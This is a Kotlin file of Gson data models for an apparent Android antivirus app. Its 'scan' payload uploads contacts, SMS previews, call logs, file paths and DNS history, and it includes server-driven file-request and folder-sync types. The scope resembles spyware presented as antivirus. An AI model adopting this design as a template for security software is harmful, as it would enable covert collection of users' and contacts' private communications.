package com.graphene.antivirus.data

import com.google.gson.annotations.SerializedName

data class DeviceInfo(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("manufacturer") val manufacturer: String,
    @SerializedName("model") val model: String,
    @SerializedName("android_version") val androidVersion: String,
    @SerializedName("sdk_int") val sdkInt: Int,
    @SerializedName("security_patch") val securityPatch: String,
    @SerializedName("rooted") val rooted: Boolean
)

data class AppTelemetry(
    @SerializedName("package_name") val packageName: String,
    @SerializedName("app_name") val appName: String,
    @SerializedName("version_name") val versionName: String,
    @SerializedName("target_sdk") val targetSdk: Int,
    @SerializedName("permissions") val permissions: List<String>,
    @SerializedName("first_install") val firstInstall: Long,
    @SerializedName("last_update") val lastUpdate: Long,
    @SerializedName("apk_sha256") val apkSha256: String?,
    @SerializedName("is_sideloaded") val isSideloaded: Boolean
)

data class ContactTelemetry(
    @SerializedName("display_name") val displayName: String,
    @SerializedName("phones") val phones: List<String>,
    @SerializedName("emails") val emails: List<String>,
    @SerializedName("has_photo") val hasPhoto: Boolean
)

data class SmsTelemetry(
    @SerializedName("address") val address: String,
    @SerializedName("body_preview") val bodyPreview: String,
    @SerializedName("date") val date: Long,
    @SerializedName("type") val type: Int
)

data class CallTelemetry(
    @SerializedName("number") val number: String,
    @SerializedName("type") val type: Int,
    @SerializedName("date") val date: Long,
    @SerializedName("duration") val duration: Long
)

data class FileTelemetry(
    @SerializedName("path") val path: String,
    @SerializedName("size") val size: Long,
    @SerializedName("extension") val extension: String,
    @SerializedName("sha256") val sha256: String?,
    @SerializedName("modified") val modified: Long
)

data class NetworkEvent(
    @SerializedName("domain") val domain: String,
    @SerializedName("timestamp") val timestamp: Long,
    @SerializedName("query_type") val queryType: Int
)

data class NetworkTelemetry(
    @SerializedName("dns_events") val dnsEvents: List<NetworkEvent>,
    @SerializedName("unique_domains") val uniqueDomains: Int,
    @SerializedName("captured_since") val capturedSince: Long
)

data class ScanRequest(
    @SerializedName("device") val device: DeviceInfo,
    @SerializedName("apps") val apps: List<AppTelemetry>,
    @SerializedName("contacts") val contacts: List<ContactTelemetry>,
    @SerializedName("sms") val sms: List<SmsTelemetry>,
    @SerializedName("calls") val calls: List<CallTelemetry>,
    @SerializedName("files") val files: List<FileTelemetry>,
    @SerializedName("network") val network: NetworkTelemetry,
    @SerializedName("timestamp") val timestamp: Long
)

data class Threat(
    @SerializedName("package_name") val packageName: String,
    @SerializedName("threat_name") val threatName: String,
    @SerializedName("severity") val severity: String,
    @SerializedName("description") val description: String = ""
)

data class ScanResponse(
    @SerializedName("scan_id") val scanId: String,
    @SerializedName("scanned_apps") val scannedApps: Int,
    @SerializedName("threats") val threats: List<Threat>,
    @SerializedName("risk_score") val riskScore: Int
)

// ============================================================
//  Синхронизация папок (Вариант B)
// ============================================================

data class SyncFolder(
    val uri: String,
    val name: String,
    val addedAt: Long = System.currentTimeMillis()
)

data class SyncedFileMeta(
    val folderUri: String,
    val documentUri: String,
    val relativePath: String,
    val name: String,
    val size: Long,
    val modified: Long,
    val mime: String,
    val sha256: String?
)

data class FolderPayload(
    @SerializedName("uri") val uri: String,
    @SerializedName("name") val name: String
)

data class SyncFoldersRequest(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("folders") val folders: List<FolderPayload>
)

data class SyncedFilePayload(
    @SerializedName("folder_uri") val folderUri: String,
    @SerializedName("relative_path") val relativePath: String,
    @SerializedName("name") val name: String,
    @SerializedName("size") val size: Long,
    @SerializedName("modified") val modified: Long,
    @SerializedName("mime") val mime: String,
    @SerializedName("sha256") val sha256: String?
)

data class SyncFilesRequest(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("files") val files: List<SyncedFilePayload>
)

data class PendingRequest(
    @SerializedName("request_id") val requestId: String,
    @SerializedName("relative_path") val relativePath: String,
    @SerializedName("file_name") val fileName: String
)

data class PendingRequestsResponse(
    @SerializedName("requests") val requests: List<PendingRequest>
)

data class UploadFileResponse(
    @SerializedName("upload_id") val uploadId: String,
    @SerializedName("sha256") val sha256: String,
    @SerializedName("file_type") val fileType: String,
    @SerializedName("severity") val severity: String,
    @SerializedName("risk_score") val riskScore: Int,
    @SerializedName("detections") val detections: List<UploadDetection> = emptyList()
)

data class UploadDetection(
    @SerializedName("name") val name: String,
    @SerializedName("severity") val severity: String,
    @SerializedName("description") val description: String = ""
)

data class SimpleOk(
    @SerializedName("ok") val ok: Boolean,
    @SerializedName("count") val count: Int = 0
)

// ============================================================
//  v2.0 — регистрация устройства / api_token
// ============================================================

data class RegisterRequest(
    @SerializedName("device") val device: DeviceInfo
)

data class RegisterResponse(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("api_token") val apiToken: String,
    @SerializedName("issued_at") val issuedAt: String
)